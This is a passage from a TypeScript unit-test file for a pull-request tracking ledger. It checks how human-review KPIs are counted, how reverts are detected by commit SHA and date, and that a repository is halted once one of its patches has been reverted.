  // structural answer is that `applyReviewObservation` (which WRITES a cumulative counter) and
  // `packetChecks` (which REPORTS the gap) ask `isTerminalReviewSubject` rather than each carrying
  // a hand-written copy of "is this packet in the KPI's population". This asserts the agreement on
  // the case where two plausible hand-written copies come apart: a packet whose PR someone else
  // closed, which this ledger never absorbed and never counted as a terminal outcome.
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const rejected = applyReject(state, submitted.id, "operator mis-typed reject").state;
  const packet = rejected.packets.find((p) => p.id === submitted.id)!;
  assert.equal(packet.status, "rejected");
  assert.equal(packet.prMeta?.state, "open", "the ledger never absorbed a close for this packet");

  // The predicate says no...
  assert.equal(isTerminalReviewSubject(packet), false);
  // ...so the writer refuses to fold it into `noReview`'s denominator, even though GitHub says the
  // PR is closed. A fold here would count a terminal outcome the scorecard never recorded.
  const wrote = applyReviewObservation(rejected, packet.id, { reviews: 0, comments: 0 });
  assert.match(wrote.error ?? "", /still open/);
  assert.deepEqual(wrote.state.scorecard, rejected.scorecard);
  // ...and the reporter stays quiet about it, on the same GitHub answer.
  const closedLive = {
    state: "closed" as const,
    merged: false,
    draft: packet.prMeta!.draft,
    headSha: packet.prMeta!.headSha,
    body: VERBATIM_BODY,
  };
  assert.equal(
    packetChecks(packet, closedLive).advisory.some((a) => /no human-review observation/.test(a)),
    false,
    "nagging about a denominator this packet was never in is noise on the channel",
  );

  // And the complement, so neither half above passes by being uniformly silent: once the ledger
  // HAS absorbed a terminal outcome, the predicate says yes, the reporter speaks, and the writer
  // accepts. Same packet, same live answer — only the stored meta changed.
  const absorbed = {
    ...rejected,
    packets: rejected.packets.map((p) =>
      p.id === packet.id ? { ...p, prMeta: { ...p.prMeta!, state: "closed" as const } } : p,
    ),
  };
  const now = absorbed.packets.find((p) => p.id === packet.id)!;
  assert.equal(isTerminalReviewSubject(now), true);
  assert.equal(
    packetChecks(now, closedLive).advisory.some((a) => /no human-review observation/.test(a)),
    true,
  );
  assert.equal(applyReviewObservation(absorbed, now.id, { reviews: 0, comments: 0 }).recorded, true);
});

test("a merge sha too short to identify a commit is not matched against, it is refused", () => {
  // `classifyRevert` matches by prefix in BOTH directions — `merge.startsWith(named) ||
  // named.startsWith(merge)` — because a `git revert` message may abbreviate the sha it names. That
  // is what makes a too-short recorded sha dangerous rather than merely useless: with `mergeCommitSha
  // = "a"`, every revert commit on the base branch that names any sha beginning with `a` matches,
  // and SPEC.md §7 halts a repository on a revert of somebody else's patch. The length guard is the
  // only thing stopping it, and it deleted green.
  const commits = [
    {
      sha: "ffff1110000000000000000000000000000000aa",
      message: 'Revert "someone else\'s change"\n\nThis reverts commit abcdef1234567.',
      committedAt: "2026-08-28T09:00:00Z",
    },
  ];
  const tooShort = classifyRevert({ mergeCommitSha: "abcdef", mergedAt: "2026-08-27T07:04:52Z", commits });
  assert.equal(tooShort.reverted, false, "six characters cannot identify a commit");
  assert.match(tooShort.why, /nothing to revert/, `it must refuse, not silently not-match:\n${tooShort.why}`);
  // The control: one more character and the very same input is a match, so the refusal above is
  // about the LENGTH and not about the fixture failing to match for some other reason.
  const longEnough = classifyRevert({ mergeCommitSha: "abcdef1", mergedAt: "2026-08-27T07:04:52Z", commits });
  assert.equal(longEnough.reverted, true, "seven characters is git's own abbreviation floor");
});

test("applyReviewObservation refuses everything that is not a one-time terminal recovery", () => {
  // The recovery writer folds into CUMULATIVE counters and runs on every reconcile, forever. Its
  // refusals are the only thing between `noReview`/`reviewCommentsAvg` and a KPI that grows once
  // every six hours on its own, so each refusal is asserted rather than assumed.
  const state = seedState();
  const merged = state.packets.find((p) => p.status === "merged")!;
  const submitted = state.packets.find((p) => p.status === "submitted")!;

  assert.match(
    applyReviewObservation(state, "pkt_nope", { reviews: 1, comments: 1 }).error ?? "",
    /unknown packet/,
  );

  // An OPEN PR: `noReview` and `reviewCommentsAvg` are defined over terminal outcomes only, so
  // folding one in would put a PR still under review into a mean of finished ones.
  const open = applyReviewObservation(state, submitted.id, { reviews: 1, comments: 1 });
  assert.match(open.error ?? "", /still open/);
  assert.equal(open.recorded, false);

  // A packet with no PR at all has nothing to attach an observation to.
  const parked = state.packets.find((p) => p.status === "parked")!;
  assert.match(
    applyReviewObservation(state, parked.id, { reviews: 1, comments: 1 }).error ?? "",
    /no recorded PR/,
  );

  // Already observed: a no-op, and NOT an error — this is the common case on every tick forever.
  const again = applyReviewObservation(state, merged.id, { reviews: 9, comments: 9 });
  assert.equal(again.error, undefined);
  assert.equal(again.recorded, false, "a second fold would inflate a cumulative counter");
  assert.deepEqual(again.state.scorecard, state.scorecard, "and it must not have touched the row");

  // The one path that does work, and its guard closing behind it.
  const blind = {
    ...state,
    packets: state.packets.map((p) =>
      p.id === merged.id ? { ...p, prMeta: { ...p.prMeta!, humanReview: undefined } } : p,
    ),
  };
  const before = scorecardRow(blind.scorecard, merged.repoId)!;
  const first = applyReviewObservation(blind, merged.id, { reviews: 1, comments: 2 });
  assert.equal(first.recorded, true);
  const after = scorecardRow(first.state.scorecard, merged.repoId)!;
  assert.equal(after.humanReviewedPrs, before.humanReviewedPrs + 1);
  assert.equal(after.humanReviewComments, before.humanReviewComments + 2);
  assert.equal(applyReviewObservation(first.state, merged.id, { reviews: 1, comments: 2 }).recorded, false);
  // The event says where the number has to be promoted to, because local state is gitignored.
  assert.match(
    first.state.events.map((e) => e.message).join("\n"),
    /Human review recovered .*factory\/seed\.ts/s,
  );
});

test("applyRevert is the producer reverts never had: it counts, it stops the repo, it counts once", () => {
  const state = seedState();
  const mergedPacket = state.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_42")!;
  assert.equal(repoHealth(state.scorecard, mergedPacket.repoId), "good");

  const recorded = applyRevert(state, mergedPacket.id, {
    source: "commit",
    sha: "ffff1110000000000000000000000000000000aa",
    why: 'ffff111 on main reverts our merge commit 36d0f237 ("Revert \\"fix validator\\"")',
    at: "2026-08-28T09:00:00.000Z",
  });
  assert.equal(recorded.error, undefined);
  assert.equal(recorded.recorded, true);
  const row = scorecardRow(recorded.state.scorecard, mergedPacket.repoId)!;
  assert.equal(row.reverts, 1);
  // SPEC.md §7: a repository MUST halt on any revert of the operator's patch.
  assert.equal(repoHealth(recorded.state.scorecard, mergedPacket.repoId), "stop");
  assert.equal(maySelectRepo(recorded.state, mergedPacket.repoId).ok, false);
  const after = recorded.state.packets.find((p) => p.id === mergedPacket.id)!;
  assert.ok(after.followUps?.some((f) => f.body.startsWith("revert:")));

  // Idempotent: `reconcile` re-checks every merged packet on every run, so the same revert commit
  // arrives again and again. One revert is one revert.
  const twice = applyRevert(recorded.state, mergedPacket.id, {
    source: "commit",
    sha: "ffff1110000000000000000000000000000000aa",
    why: "same commit, next reconcile",
    at: "2026-08-29T09:00:00.000Z",
  });
  assert.equal(twice.recorded, false);
  assert.equal(scorecardRow(twice.state.scorecard, mergedPacket.repoId)!.reverts, 1);
});

test("applyRevert refuses a packet that was never merged, and one it has never heard of", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const notMerged = applyRevert(state, submitted.id, { source: "operator", why: "maintainer said so" });
  assert.match(notMerged.error ?? "", /submitted/);
  assert.equal(scorecardRow(notMerged.state.scorecard, submitted.repoId)!.reverts, 0);

  const unknown = applyRevert(state, "pkt_nope", { source: "operator", why: "x" });
  assert.match(unknown.error ?? "", /unknown packet/);
});

test("a recorded revert points the operator at the seed, never at allowlist.yaml", () => {
  // The shipped line told the operator the repo was "unselectable until a human edits
  // allowlist.yaml". Following that instruction is actively destructive: `emptyScorecard()` maps
  // its rows from `ALLOWLIST`, and `health()` gates on `row.reverts > 0` — so removing the repo
  // from the roster deletes the scorecard row and with it the `reverts: 1` this whole unit exists
  // to produce. `allowlist.yaml` carries `version`, `caps`, `denylist`, `repos` and nothing that
  // touches reverts; there is no edit to it that clears a revert stop.
  const state = seedState();
  const packet = state.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_42")!;
  const recorded = applyRevert(state, packet.id, {
    source: "commit",
    sha: "ffff1110000000000000000000000000000000aa",
    why: "ffff111 on main reverts our merge commit 36d0f237",
    at: "2026-08-28T09:00:00.000Z",
  });
  const score = recorded.state.events.filter((e) => e.kind === "score").map((e) => e.message);
  const line = score.find((d) => d.startsWith("REVERT recorded"));
  assert.ok(line, `applyRevert must leave a score event:\n${score.join("\n")}`);
  assert.match(line!, /factory\/seed\.ts/);
  assert.equal(
    /edits? allowlist\.yaml/.test(line!),
    false,
    `the roster edit deletes the scorecard row that holds the count:\n${line}`,
  );
  // The reader is told what actually holds the stop, so the remedy is checkable rather than folklore.
  assert.match(line!, /reverts > 0/);
});

test("the revert note carries which half of the definition recorded it", () => {
  // docs/08-operations.md defines a revert two ways — an explicit `git revert` of our merge commit
  // (mechanical) and "a maintainer-stated rollback naming the PR" (prose). The two producers are
  // deliberately different kinds of evidence, so which one wrote the row has to survive into the
  // record; a note that says only "reverted" cannot be audited back to what was actually seen.
  const state = seedState();
  const id = "pkt_ravidsrk_orca-fleet_42";
  const byCommit = applyRevert(state, id, {
    source: "commit",
    sha: "ffff1110000000000000000000000000000000aa",
    why: "ffff111 on main reverts our merge commit 36d0f237",
  });
  const commitNote = revertNote(byCommit.state.packets.find((p) => p.id === id)!)!;
  assert.match(commitNote.body, /^revert: \(commit\) /);
  // The abbreviated sha is in the record: a revert nobody can look up is not evidence.
  assert.match(commitNote.body, /ffff11100000/);

  const byOperator = applyRevert(state, id, {
    source: "operator",
    why: "maintainer rolled it back in the release thread",
  });
  const operatorNote = revertNote(byOperator.state.packets.find((p) => p.id === id)!)!;
  assert.match(operatorNote.body, /^revert: \(operator\) /);
  assert.equal(
    /\(commit\)/.test(operatorNote.body),
    false,
    "a human's reading of prose must never be recorded as a matched commit",
  );
});

test("revertNote reads notes only — a followUp of another kind cannot masquerade as one", () => {
  // `revertNote` is the dedupe key AND the clock's "is it already recorded" test, so a followUp
  // that merely starts with the prefix must not silence a real revert. `applyRevert` writes
  // `kind: "note"`; every other kind is a different record type with a different lifecycle.
  const state = seedState();
  const packet = state.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_42")!;
  const impostor = {
    ...packet,
    followUps: [
      ...(packet.followUps ?? []),
      { id: "fu_x", at: "2026-08-28T09:00:00.000Z", kind: "quiet" as const, body: "revert: (commit) ffff111 — looks like one" },
    ],
  };
  assert.equal(revertNote(impostor), undefined);
  const real = {
    ...impostor,
    followUps: [
      ...impostor.followUps,
      { id: "fu_y", at: "2026-08-28T09:00:00.000Z", kind: "note" as const, body: "revert: (commit) ffff111 — the record" },
    ],
  };
  assert.equal(revertNote(real)?.id, "fu_y");
});

test("applyReviewToScorecard writes exactly one row, and counts rather than clamps", () => {
  // The repo guard is the difference between a KPI and a headline. `factoryKpis()` sums `noReview`
  // across every allowlist row, so a fold that forgot which row it was writing would multiply the
  // published number by the size of the roster — eight rows today. The identical guard in
  // `applyPacketToScorecard` is pinned; this one was not, so writing the WRONG row was caught and
  // writing EVERY row was not.
  const repo = "ravidsrk/orca-fleet";
  const rows = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 0, comments: 0 });
  assert.equal(rows.filter((r) => r.noReview > 0).length, 1, "exactly one row may move");
  assert.equal(scorecardRow(rows, repo)!.noReview, 1);
  for (const other of rows.filter((r) => r.repoId !== repo)) {
    assert.deepEqual(
      { noReview: other.noReview, hrc: other.humanReviewComments, hrp: other.humanReviewedPrs, avg: other.reviewCommentsAvg },
      { noReview: 0, hrc: 0, hrp: 0, avg: 0 },
      `${other.repoId} was never terminal and must not carry a review number`,
    );
  }
  const commented = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 1, comments: 3 });
  assert.equal(commented.filter((r) => r.humanReviewedPrs > 0).length, 1);
  assert.equal(commented.reduce((a, r) => a + r.humanReviewComments, 0), 3, "the fleet total is one PR's comments");

  // And it accumulates: two silent terminals on one repo are two, not "some". A `> 0 ? 1 : 0`
  // clamp anywhere on this path satisfies every single-PR assertion in the suite.
  let twice = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 0, comments: 0 });
  twice = applyReviewToScorecard(twice, repo, { reviews: 0, comments: 0 });
  assert.equal(scorecardRow(twice, repo)!.noReview, 2);
  let thrice = applyReviewToScorecard(emptyScorecard(), repo, { reviews: 1, comments: 2 });
  thrice = applyReviewToScorecard(thrice, repo, { reviews: 1, comments: 4 });
  assert.equal(scorecardRow(thrice, repo)!.humanReviewedPrs, 2);
  assert.equal(scorecardRow(thrice, repo)!.humanReviewComments, 6);
  assert.equal(scorecardRow(thrice, repo)!.reviewCommentsAvg, 3);
});

test("a commit that names our merge but predates it is not a revert of it", () => {
  // `git revert` writes `This reverts commit <sha>` and the classifier accepts nothing else — but a
  // message is just text, and a commit that landed BEFORE the merge cannot have reverted it. The
  // `since` window makes this rare from GitHub and not impossible: `since` is a committer-date
  // filter, and committer dates are writable. Without the guard, a cherry-pick or a rebased branch
  // carrying that line stops a repository under SPEC.md §7 for something that never happened.
  const merge = "36d0f23708adbdf911e4df050ed516821278a9fc";
  const before = classifyRevert({
    mergeCommitSha: merge,
    mergedAt: "2026-08-27T07:04:52Z",
    commits: [
      {
        sha: "eeee111",
        message: `Revert "fix validator"\n\nThis reverts commit ${merge}.`,
        committedAt: "2026-08-26T09:00:00Z",
      },
    ],
  });
  assert.equal(before.reverted, false, "a commit older than the merge cannot revert it");
  assert.match(before.why, /no commit on the base branch/);

  // The same commit one second after the merge is the real thing, so the guard is a date test and
  // not an accidental filter on the message.
  const after = classifyRevert({
    mergeCommitSha: merge,
    mergedAt: "2026-08-27T07:04:52Z",
    commits: [
      {
        sha: "eeee111",
        message: `Revert "fix validator"\n\nThis reverts commit ${merge}.`,
        committedAt: "2026-08-27T07:04:53Z",
      },
    ],
  });
  assert.equal(after.reverted, true);
});

test("the seed's review KPIs are re-derived from its own packets, not typed beside them", () => {
  // Issue #39's acceptance is "Ledger output shows non-hand-seeded values". The values in
  // `factory/seed.ts` ARE derived — but nothing held them to it, so the next hand edit could put
  // any number there and the whole suite would stay green, which is the exact defect this unit was
  // opened about, one level up. This recomputes the published columns from the packets' own
  // `prMeta.humanReview` using the same fold the live path uses.
  const seed = seedState();
  const terminal = seed.packets.filter((p) => p.prMeta && (p.prMeta.merged || p.prMeta.state === "closed"));
  assert.ok(terminal.length >= 3, `the seed must carry terminal packets or this proves nothing: ${terminal.length}`);
  let derived = emptyScorecard();
  for (const p of terminal) derived = applyReviewToScorecard(derived, p.repoId, p.prMeta!.humanReview);
  for (const row of seed.scorecard) {
    const mine = scorecardRow(derived, row.repoId)!;
    assert.deepEqual(
      {
        noReview: row.noReview,
        humanReviewComments: row.humanReviewComments,
        humanReviewedPrs: row.humanReviewedPrs,
        reviewCommentsAvg: row.reviewCommentsAvg,
      },
      {
        noReview: mine.noReview,
        humanReviewComments: mine.humanReviewComments,
        humanReviewedPrs: mine.humanReviewedPrs,
        reviewCommentsAvg: mine.reviewCommentsAvg,
      },
      `${row.repoId}: the published review KPIs must equal what its own packets fold to`,
    );
  }
  // Non-vacuous: some row actually carries each of the two counters.
  assert.ok(seed.scorecard.some((r) => r.humanReviewedPrs > 0), "a mean over nothing proves nothing");
  assert.ok(seed.scorecard.some((r) => r.noReview > 0), "a noReview column of all zeros proves nothing");
});

test("a bare approval is review activity that moves neither counter, and says so in its own words", () => {
  // The fourth outcome, and the only one no assertion reached. docs/08-operations.md keeps the two
  // KPIs on different denominators precisely so this case exists: a maintainer who clicks Approve
  // with no text IS review activity (so the PR is not `noReview`) and contributes NO review comment
  // (so it stays out of the `reviewCommentsAvg` denominator). Unasserted, its message could be
  // deleted, or reworded to contain both other messages' key phrases, and the suite stayed green —
  // against `recordTerminalReview`'s own claim that "no two of them can satisfy the same assertion".
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const approved = applyPrSync(
    state,
    submitted.id,
    prMetaAt("2026-09-01T00:00:00.000Z", {
      merged: true,
      state: "closed",
      humanReview: { reviews: 1, comments: 0 },
    }),
    { threadsAnswered: true, at: "2026-09-02T00:00:00.000Z" },
  );
  assert.equal(approved.error, undefined);
  const row = scorecardRow(approved.state.scorecard, submitted.repoId)!;
  assert.equal(row.noReview, 0, "a human approved it — that is not silence");
  assert.equal(row.humanReviewedPrs, 0, "a bare approval has no comment to average");
  assert.equal(row.humanReviewComments, 0);
  assert.equal(row.reviewCommentsAvg, 0);

  const messages = approved.state.events.map((e) => e.message);
  const said = messages.find((m) => m.includes("Human review with no review comment"));
  assert.ok(said, `the bare-approval arm must state itself:\n${messages.join("\n")}`);
  assert.match(said!, /neither noReview nor the reviewCommentsAvg denominator moves/);
  // The three outcomes are worded so no two satisfy the same assertion. Hold them to it.
  assert.equal(
    messages.some((m) => m.includes("no human review") || m.includes("Human review not observed")),
    false,
    `a bare approval is neither silence nor an unread endpoint:\n${messages.join("\n")}`,
  );
  assert.equal(
    messages.some((m) => m.includes("reviewCommentsAvg now")),
    false,
    "nothing entered the mean, so nothing may announce a new mean",
  );
});

test("applyRevert writes the note and the counter together", () => {
  // The clock's revert FATAL reads `revertNote(packet)` — it is handed one packet and never sees
  // the scorecard — while the KPI it protects is `row.reverts`. The two are only equivalent because
  // this is the sole writer of either and it writes both in one step. Pin that, or the equivalence
  // the check rests on is folklore.
  const state = seedState();
  const id = "pkt_ravidsrk_orca-fleet_42";
  const repoId = state.packets.find((p) => p.id === id)!.repoId;
  assert.equal(scorecardRow(state.scorecard, repoId)!.reverts, 0);
  assert.equal(revertNote(state.packets.find((p) => p.id === id)!), undefined);

  const after = applyRevert(state, id, { source: "commit", sha: "ffff111", why: "reverted" }).state;
  assert.ok(revertNote(after.packets.find((p) => p.id === id)!), "the note is the record the clock reads");
  assert.equal(scorecardRow(after.scorecard, repoId)!.reverts, 1, "the counter is the KPI the note protects");

  // A refused revert moves neither, so the pairing holds on the failure path too.
  const refused = applyRevert(state, state.packets.find((p) => p.status === "submitted")!.id, {
    source: "operator",
    why: "never merged",
  });
  assert.ok(refused.error);
  assert.equal(refused.state.scorecard.reduce((a, r) => a + r.reverts, 0), 0);
  assert.equal(refused.state.packets.filter((p) => revertNote(p)).length, 0);
});
